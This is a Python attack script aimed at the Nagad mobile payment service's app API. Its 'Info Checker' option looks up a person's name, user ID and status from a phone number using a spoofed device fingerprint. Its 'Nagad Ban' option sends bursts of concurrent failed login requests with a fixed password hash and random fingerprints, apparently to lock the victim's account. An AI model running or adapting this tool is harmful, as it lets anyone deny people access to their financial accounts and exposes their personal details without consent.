import requests
import random
import string
import threading
import os
import subprocess
from termcolor import colored

# Check and install missing modules
def install_missing_modules():
    required_modules = ["termcolor", "requests"]
    for module in required_modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.check_call(["pip", "install", module], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Ensure required modules are installed
install_missing_modules()

# Display the banner using Python instead of figlet
banner = r"""
 __  __ _     ____  _   _ __  __  ___  _   _ 
|  \/  | |   |  _ \| | | |  \/  |/ _ \| \ | |
| |\/| | |   | |_) | | | | |\/| | | | |  \| |
| |  | | |___|  _ <| |_| | |  | | |_| | |\  |
|_|  |_|_____|_| \_\\___/|_|  |_|\___/|_| \_|

"""

colored_banner = banner.replace("W8", colored("W8", "red")).replace("Team", colored("Team", "green"))
print(colored_banner)

# Function to generate a random X-KM-DEVICE-FGP value
def generate_random_fgp():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=64))

def nagad_login():
    # Define the URL for login
    url = 'https://app2.mynagad.com:20002/api/login'

    # Define the headers
    headers = {
        'Host': 'app2.mynagad.com:20002',
        'User-Agent': 'okhttp/3.14.9',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json; charset=UTF-8',
        'X-KM-UserId': '1894306',
        'X-KM-User-AspId': '100012345612345',
        'X-KM-User-Agent': 'ANDROID/1164',
        'X-KM-Accept-language': 'bn',
        'X-KM-AppCode': '01'
    }

    # Get user input for Number
    username = input("Enter the Number: ")

    # Define the payload
    payload = {
        "aspId": "100012345612345",
        "mpaId": None,
        "password": "2EE1A4C2B1F11F0CA375D1429E7902A1D84B900348AE65E624C83B1589FF2E27",
        "username": username
    }

    # Function to send a single request
    def send_request(request_number):
        local_headers = headers.copy()
        local_headers['X-KM-DEVICE-FGP'] = generate_random_fgp()
        print(f"Sending request {request_number}...")
        response = requests.post(url, headers=local_headers, json=payload)
        print(f"Request {request_number} Status Code:", response.status_code)
        print(f"Request {request_number} Response Text:", response.text)

    # Send 10 POST requests quickly using threads
    threads = []
    for i in range(10):
        thread = threading.Thread(target=send_request, args=(i + 1,))
        threads.append(thread)
        thread.start()

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

def nagad_check_user():
    # Define the URL for checking user status
    url = "https://app2.mynagad.com:20002/api/user/check-user-status-for-log-in"

    # Get input for msisdn
    msisdn = input("Enter the Number: ")

    # Define the query parameters
    params = {
        "msisdn": msisdn
    }

    # Define the headers
    headers = {
        "Host": "app2.mynagad.com:20002",
        "User-Agent": "okhttp/3.14.9",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "X-KM-User-AspId": "100012345612345",
        "X-KM-User-Agent": "ANDROID/1164",
        "X-KM-DEVICE-FGP": generate_random_fgp(),
        "X-KM-Accept-language": "bn",
        "X-KM-AppCode": "01"
    }

    # Make the GET request
    response = requests.get(url, headers=headers, params=params)

    # Parse the response
    if response.status_code == 200:
        try:
            data = response.json()
            # Filter and print specific fields
            print("Name:", data.get("name", "N/A"))
            print("UserId:", data.get("userId", "N/A"))
            print("Status:", data.get("status", "N/A"))
        except json.JSONDecodeError:
            print("Failed to parse response as JSON.")
    else:
        print("Request failed with status code:", response.status_code)

# Main menu
while True:
    print("\nSelect an option:")
    print("1. Nagad Haf Info Checker")
    print("2. Nagad Ban")
    print("3. Exit")
    choice = input("Enter your choice: ")

    if choice == "1":
        nagad_check_user()
    elif choice == "2":
        nagad_login()
    elif choice == "3":
        print("Exiting...")
        break
    else:
        print("Invalid choice. Please try again.")